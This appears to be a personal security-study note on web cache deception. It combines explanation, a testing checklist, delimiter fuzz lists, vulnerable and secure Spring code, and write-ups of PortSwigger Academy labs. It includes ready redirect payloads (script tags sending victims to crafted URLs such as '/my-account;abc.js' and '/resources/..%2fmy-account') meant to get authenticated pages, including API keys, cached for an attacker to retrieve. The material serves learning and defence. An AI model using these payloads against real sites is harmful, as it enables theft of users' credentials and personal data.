tactic: Credential Access

**Web Cache Deception** tricks a cache into storing a dynamic response containing sensitive data by crafting a URL that the cache misidentifies as a static resource. Unlike [[Web Cache Poisoning]] where you poison what others receive, here you make the cache store a victim's personal response so you can retrieve it.

```
1. Attacker crafts a URL that looks static to the cache but dynamic to the origin
2. Victim is tricked into visiting that URL (their authenticated response is stored)
3. Cache stores the response thinking it's a static file
4. Attacker requests the same URL and receives the cached response containing victim's data
```


Cache decisions are based on cache rules  commonly:

```
File extension   .css  .js  .ico  .png  .woff
Directory prefix /static  /assets  /scripts  /images
File name        robots.txt  favicon.ico
```

---

## Core Concept  Discrepancy

The entire attack relies on a **discrepancy** between how the cache and origin server interpret the same URL:

```
URL: /my-account/wcd.js

Cache thinks:   this ends in .js → static file → cache it
Origin thinks:  this is /my-account with extra path → return user profile
```

---

## Injection Points

- Any endpoint returning sensitive authenticated content (`/my-account`, `/profile`, `/dashboard`, `/api/user`)
- URL path after the dynamic endpoint
- Path delimiters interpreted differently by cache vs origin (`/profile;foo.js`, `/profile%00foo.css`)
- Encoded characters used as delimiters (`%23`, `%00`, `%2f`)
- Path traversal sequences in static prefixes (`/resources/..%2fmy-account`)

---

## Checklist

### Step 1, Identify Target Endpoints

- [ ]  Focus on `GET`, `HEAD`, `OPTIONS` requests that return sensitive dynamic content
- [ ]  Look for: `/my-account`, `/profile`, `/dashboard`, `/api/user/me`, `/settings`
- [ ]  Install Param Miner, enable dynamic cache buster in settings

### Step 2, Identify Cache Behaviour

- [ ]  Check response headers for cache indicators:

```
	X-Cache: hit      → response served from cache
	X-Cache: miss     → response fetched from origin
	X-Cache: dynamic  → not suitable for caching
	X-Cache: refresh  → content outdated, refreshed
	Age: 30           → seconds the response has been cached
```

- [ ]  Add a cache buster to avoid poisoning real users during testing:

```
	/my-account?cb=12345
```

### Step 3, Find Path Discrepancies

**Static extension discrepancy:**

- [ ]  Append a static extension to a dynamic path and check if it gets cached:

```
	/my-account/wcd.js
	/my-account/test.css
	/my-account/fake.ico
```

```
If `X-Cache: miss` on first request and `X-Cache: hit` on second → cached
```

**Delimiter discrepancy:**

- [ ]  Test which chars the origin server uses as delimiters by checking if the response is identical to the base:

```
	/my-account/abc       → 404 = not a delimiter
	/my-account;abc       → 200 = ; is a delimiter (Java Spring)
	/my-account.abc       → 200 = . is a delimiter (Ruby on Rails)
	/my-account%00abc     → 200 = %00 is a delimiter (OpenLiteSpeed)
	/my-account%23abc     → 200 = %23 (#) is a delimiter
```

- [ ]  Once delimiter confirmed, append a static extension after it:

```
	/my-account;wcd.js    → origin sees /my-account, cache sees .js → caches it
	/my-account%23wcd.css
```

- [ ]  Fuzz all delimiter candidates with Intruder:

```
	/my-account§§abc
```

```
200 = delimiter used by origin, test each one
```

**Full delimiter list to fuzz:**

```
! " # $ % & ' ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~
%21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2D %2E %2F
%3A %3B %3C %3D %3E %3F %40 %5B %5C %5D %5E %5F %60 %7B %7C %7D %7E
```

**Normalization discrepancy:**

- [ ]  Check if the origin server normalizes path traversal (resolves `..%2f` before routing):

```
	/resources/..%2fmy-account
```

```
If cached → cache normalized the path to `/resources/` prefix and cached it, origin served `/my-account`
```

- [ ]  Test cache normalization by checking if a traversal sequence breaks the cache rule:

```
	/aaa/..%2fassets/js/stockCheck.js
```

```
Not cached → cache does not normalize, confirms `/assets` cache rule exists
```

- [ ]  Exploit with path traversal into dynamic endpoint:

```
	/<static-prefix>/..%2f<dynamic-path>
	/resources/..%2fmy-account?wcd
```

- [ ]  Combine delimiter and normalization:

```
	/my-account%23%2f%2e%2e%2fresources?wcd
```

```
Origin uses `#` as delimiter → sees `/my-account`, cache resolves traversal → sees `/resources`
```

---

## Attack Payloads

**Path mapping  append static extension:**


```javascript
<script>document.location="https://target.com/my-account/wcd.js"</script>
```

**Delimiter discrepancy semicolon (Java Spring):**

```javascript
<script>document.location="https://target.com/my-account;abc.js"</script>
```

**Origin normalization — path traversal from static dir:**

```javascript
<script>document.location="https://target.com/resources/..%2fmy-account?wcd"</script>
```

**Cache normalization — delimiter + traversal combo:**


```javascript
<script>document.location="https://target.com/my-account%23%2f%2e%2e%2fresources?wcd"</script>
```

**Delivery — host the script on your exploit server, send link to victim, then fetch the cached URL yourself.**

---

## Framework Delimiter Reference

|Framework|Delimiter|Example|
|---|---|---|
|Java Spring|`;`|`/profile;wcd.js`|
|Ruby on Rails|`.`|`/profile.ico`|
|OpenLiteSpeed|`%00`|`/profile%00wcd.js`|
|Generic|`%23` (#)|`/profile%23wcd.css`|
|Generic|`%3f` (?)|`/profile%3fwcd.css`|

---

## White Box Testing

**Vulnerable, origin ignores path suffix after delimiter, cache caches based on extension:**


```java
// Spring — matrix variables enabled, semicolon is treated as delimiter
// /my-account;wcd.js → Spring routes to /my-account, ignores ;wcd.js
@GetMapping("/my-account")
public ResponseEntity<?> getAccount(@AuthenticationPrincipal UserDetails user) {
    // returns full account info including API keys, emails, tokens
    return ResponseEntity.ok(accountService.getDetails(user));
}

// Cache config (e.g. Varnish/Nginx/CDN) — caches anything ending in .js
// VCL rule: if (req.url ~ "\.js$") { set beresp.ttl = 3600s; }
// Attacker visits /my-account;wcd.js → cache stores the sensitive response as a JS file
```

**Vulnerable, path normalization mismatch between cache and Spring:**

```java
// Origin resolves /resources/..%2fmy-account to /my-account (Spring normalizes)
// Cache sees /resources/ prefix → applies static resource cache rule
// Result: authenticated account page cached as a static resource

@GetMapping("/my-account")
public ResponseEntity<?> getAccount(@AuthenticationPrincipal UserDetails user) {
    return ResponseEntity.ok(accountService.getDetails(user));
}
```

**Secure:**


```java
// Set Cache-Control: no-store on all authenticated/dynamic responses
@GetMapping("/my-account")
public ResponseEntity<?> getAccount(@AuthenticationPrincipal UserDetails user,
                                     HttpServletResponse response) {
    response.setHeader("Cache-Control", "no-store, no-cache, private");
    response.setHeader("Pragma", "no-cache");
    return ResponseEntity.ok(accountService.getDetails(user));
}

// Global config — apply to all authenticated endpoints via Spring Security
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .cacheControl(CacheControlConfig::disable) // sets Cache-Control: no-cache, no-store
    );
    return http.build();
}

// CDN / reverse proxy level — never cache responses with Set-Cookie or Authorization
// Nginx example:
// proxy_no_cache $http_authorization $cookie_session;
// proxy_cache_bypass $http_authorization $cookie_session;
```

---
 **Detecting cached responses**


its crucial that your able to identify cached responses  headers :
- `X-Cache`
-  `X-Cache: hit`
- `X-Cache: miss`
- `X-Cache: dynamic` -> response not  suitable for caching 
- `X-Cache: refresh` ->  content outdated and needs to be refreshed


 **Exploiting static extension cache rules**

common paths .css , .js  an attacker may be able to craft a request for a dynamic resource with a static extension that is ignored by the origin server viewed by the cache 

**Path mapping discrepancies**


URL path mapping  is a process of associating URL path with resources on a server , such as files , scripts or command executions.

2 methods : 

traditional URL: 
`/path/in/filesystem/` represents the directory path in the server's file system.
`resource.html` is the specific file being accessed.


REST-style URLs:
`/path/resource/` is an endpoint representing a resource.
`param1` and `param2` are path parameters used by the server to process the request.


`http://example.com/user/123/profile/wcd.css`

- An origin server using REST-style URL mapping may interpret this as a request for the `/user/123/profile` endpoint and returns the profile information for user `123`, ignoring `wcd.css` as a non-significant parameter.

cache that uses traditional URL mapping may view this as a request for a file named `wcd.css` located in the `/profile` directory under `/user/123`. It interprets the URL path as `/user/123/profile/wcd.css`. If the cache is configured to store responses for requests where the path ends in `.css`, it would cache and serve the profile information as if it were a CSS file.

 **Delimiter discrepancies** 

`?` generally used to separate the URL path from the query string. 
Discrepancies in how the cache and origin server use characters and strings as delimiters can result in web cache deception vulnerabilities exmaple /profile;foo.css


he Java Spring framework uses the `;` character to add parameters known as matrix variables
hence ; as a delimeter in java spring  trunactes /profile and returns profile info 

other  dont  use ; as delimiter 

Therefore, a cache that doesn't use Java Spring is likely to interpret `;` and everything after it as part of the path


onsider these requests to an origin server running the Ruby on Rails framework, which uses `.` as a delimiter to specify the response format

`/profile` - This request is processed by the default HTML formatter, which returns the user profile information.

`/profile.css` - This request is recognized as a CSS extension. There isn't a CSS formatter, so the request isn't accepted and an error is returned.

`/profile.ico` - This request uses the `.ico` extension, which isn't recognized by Ruby on Rails. The default HTML formatter handles the request and returns the user profile information. In this situation, if the cache is configured to store responses for requests ending in `.ico`, it would cache and serve the profile information as if it were a static file.

Encoded characters may also sometimes be used as delimiters. For example, consider the request `/profile%00foo.js`:

The OpenLiteSpeed server uses the encoded null `%00` character as a delimiter. other frameworks respond with an error if `%00` is in the URL. However, if the cache uses Akamai or Fastly, it would interpret `%00` and everything after it as the path.


**Exploiting delimiter discrepancies**

we may use delimiter to add static extension to the path but not the origin server.  but if we want to detect chars that are used as delimeter we need to test them on the server not cache 

- modify /settings/users/list -> /settings/users/listaaa -> ... /list;aaaa
- if the server is identical to the base response this indicate that ; is delimeter  if not then no

- once this is set we can start testing it on the cache. add a static extension to the end of the path if the response is cached this indicates that the cache does use the delimiter  and interprets the full URL , that there is  a cache rule to store responses for requests ending in .js
- make sure to test all .css , .ico , .exe 

 **Delimiter decoding discrepancies**

some special chars are usually encoded for a special meaning , some parsers decode certain chars before processing the URL. If a delimiter character is decoded, it may then be treated as a delimiter, truncating the URL path. example ``profile%23wcd.css`, which uses the URL-encoded `#` character:`  


Paths to check : `URL path prefixes, like `/static`, `/assets`, `/scripts`, or `/images``

 **Detecting normalization by the cache server**

MOST IMPORTANT understand the behaviour of the cache and server  since


look for potential static directories, look for requests with common static directories prefixes and cached responses.   
example  ``/aaa/..%2fassets/js/stockCheck.js`` -> - If the response is no longer cached, this indicates that the cache isn't normalizing the path before mapping it to the endpoint. It shows that there is a cache rule based on the `/assets` prefix.
- If the response is still cached, this may indicate that the cache has normalized the path to `/assets/js/stockCheck.js`

expoiting them  we look for this `/<static-directory-prefix>/..%2f<dynamic-path>`


or basically `/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>` --> /../

consider the payload `/profile;%2f%2e%2e%2fstatic`. The origin server uses `;` as a delimiter:

- The cache interprets the path as: `/static`
- The origin server interprets the path as: `/profie`

# LAB

**Exploiting path mapping for web cache deception**


send a request to `/my-account/abc.js`   notice that the response is contain  a response header of  cache miss and cache age  meaning that particular request is cached  with the api key loaded in the page 

```js
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
```

then visit the page 


 **Exploiting path delimiters for web cache deception**

; is used as a delimiters 

what happened is that when adding some chars account/abc -> not found 
but the static files are cached something.js 
account;something.js its cached  

``` js

<script>document.location="https://0a8e00b703bb629181859e9800ac003d.web-security-academy.net/my-account;abc.js"</script>
```



**Exploiting origin server normalization for web cache deception**

oi notices that the static files are caches and my account not so we can do a path traversal tricking the cache to cache this  i noticed that query strings ?  have a longer age while without its age 0

```js

<script>document.location="https://0acd00cd038c753a8190ca60004400e3.web-security-academy.net/resources/..%2fmy-account?wcd" </script>
```



 **Exploiting cache server normalization for web cache deception**
**send it to the intruder with the list of delimieters** 

`/my-account§§abc`  -> 200 means its the one  This indicates that they're used by the origin server as path delimiters

```js
<script>document.location="https://0aee00d0043a9dfa810016c400b80033.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>
```

## Resources

- [PortSwigger Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [HackTricks Cache Deception](https://book.hacktricks.xyz/pentesting-web/cache-deception)
- [PortSwigger Research — Gotta Cache Em All](https://portswigger.net/research/gotta-cache-em-all)